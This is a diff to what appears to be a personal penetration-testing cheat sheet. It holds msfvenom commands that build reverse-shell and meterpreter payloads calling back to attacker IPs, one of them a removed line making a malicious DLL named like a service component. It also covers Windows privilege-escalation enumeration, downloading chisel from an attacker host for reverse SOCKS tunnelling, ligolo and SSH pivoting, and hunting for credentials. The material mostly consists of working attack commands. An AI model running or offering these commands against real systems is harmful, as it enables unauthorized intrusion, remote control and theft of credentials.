@@ -152,9 +152,6 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o s
 # this produces a bash one-liner
 msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=4444 -f raw -o shell.sh
 
-# Generate dll
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
-
 # windows shells
 # meterpreter staged
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o met.exe
@@ -219,11 +216,6 @@ Get-ChildItem -Path C:\staging\htdocs -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 icacls C:\Services\EnterpriseService.exe
 
-# get scheduled tasks
-Get-ScheduledTask
-schtasks /query /fo LIST /v
-schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
-
 # Unquoted services
 # find services
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
@@ -260,6 +252,12 @@ net stop scheduler
 Restart-Service scheduler
 ```
 - look for scheduled tasks
+```bash
+# get scheduled tasks
+Get-ScheduledTask
+schtasks /query /fo LIST /v
+schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
+```
 - check powershell history for secrets
 - check for presence of keepass and .kdbx files
 - identify if there are any internal web services - always check default admin creds
@@ -331,6 +329,13 @@ wget http://192.168.45.234/chisel -O chisel
 
 # access the internal webpage at 127.0.0.1:8001 - actually cannot access the webpage but the exploit will still work
 ./chisel
+
+# use with proxychains for scanning internal networks
+iwr -uri http://192.168.45.242:8000/chisel.exe -Outfile chisel.exe
+.\chisel.exe client 192.168.45.242:8081 R:socks
+
+cat /etc/proxychains4.conf
+# socks5 127.0.0.1 1080
 ```
 - tunneling to pivot with ligolo (and double pivot)
 ```bash
@@ -381,6 +386,11 @@ sudo ip route add 10.20.119.0/24 dev ligolo
 ```bash
 # listening socket then forwarding socket, then ssh server - run this from kali to forward port 4444 on kali to a new port 4444 on web svc. sql service can only talk to web service, but not kali
 ssh -N -R 4444:127.0.0.1:4444 web_svc@192.168.220.147
+```
+- proxychains 
+```
+cat /etc/proxychains4.conf
+# socks5 127.0.0.1 1080
 ```
 ### Active Directory 
 - user powerview to gain more info on domain users
